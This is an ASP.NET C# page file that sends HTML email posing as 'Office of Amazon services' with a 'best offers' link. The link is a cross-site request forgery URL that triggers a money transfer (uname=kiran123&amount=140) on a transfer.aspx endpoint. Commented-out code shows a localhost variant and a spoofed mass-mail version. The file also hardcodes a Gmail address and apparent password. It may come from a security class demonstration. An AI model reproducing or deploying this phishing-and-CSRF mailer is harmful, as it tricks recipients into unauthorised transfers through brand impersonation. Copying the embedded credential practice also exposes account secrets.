using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class email : System.Web.UI.Page
{
 
		private void Page_Load(object sender, System.EventArgs e)
		{
			
		}

        protected void bttn_Send_Click(object sender, EventArgs e)
        {
            string from = "ashok.yaganti68@gmail.com"; //example:- sourabh9303@gmail.com
            using (MailMessage mail = new MailMessage(from, txtTo.Text))
            {
                string sb = null;
                mail.Subject = txtSubject.Text;
                mail.IsBodyHtml = true;
               // mail.Body = "Please <a href=\"http://localhost:59414/SqlInjection/transfer.aspx?uname=kiran123&amount=140\">login</a>";
                // mail.Body = txtMessage.Text;

                if (fileUploader.HasFile)
                {
                    string fileName = Path.GetFileName(fileUploader.PostedFile.FileName);
                    mail.Attachments.Add(new Attachment(fileUploader.PostedFile.InputStream, fileName));

                }
                string imageSource = (Server.MapPath("") + "\\images\\laptop.jpg");
                sb = " Dear Customer,<br><br>Please find the Amazon best offers<br/>";
                sb = sb+ "<p class='email_bodycontent'><h2>Click<a href='http://www.csrf.somee.com/transfer.aspx?uname=kiran123&amount=140\'>Here</a> to get more details</h2><br/>";
                
                sb = sb + "Sincerely,<br/>Office of Amazon services";
                mail.Body = sb;
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.EnableSsl = true;
                NetworkCredential networkCredential = new NetworkCredential(from, "srilakshmi@123");
                smtp.UseDefaultCredentials = true;
                smtp.Credentials = networkCredential;
                smtp.Port = 587;
                smtp.Send(mail);
                ClientScript.RegisterStartupScript(GetType(), "alert", "alert('Message has been sent successfully.');", true);
            }


          //  string serverAddress = HttpContext.Current.Request.ServerVariables["SERVER_NAME"].ToString();

            //SmtpClient smtpClient = new SmtpClient();
            //MailMessage objMail = new MailMessage();
            //string html = "";

            //MailAddress objMailFromaddress = new MailAddress("do-not-reply-umkc-web-email@umkc.edu", "Amazon Best Offers");
            //objMail.From = objMailFromaddress;

            //objMail.Subject = "Amazon Best offers";
            //objMail.To.Add(txtTo.Text);          
            //objMail.IsBodyHtml = true;
            //string sb = null;
            //sb = " Dear User,<br><br>Please find the Amazon best offers<br/>";
            //sb = "<p class='email_bodycontent'><h2><a href='http://www.csrf.somee.com/transfer.aspx?uname=kiran123&amount=140\'>Click Here to ge more details</h2><br/><br/>";

            //sb = sb + "<img src='images/laptop.jpg'>";
         
            
            //sb = sb + "<br/><br/>Sincerely,<br/>Office of Amazon services";            
            //objMail.Body = html.Replace("{email_bodycontent}", sb);
            //smtpClient.Host = "massmail.umkc.edu";
            //smtpClient.Send(objMail);


        }
}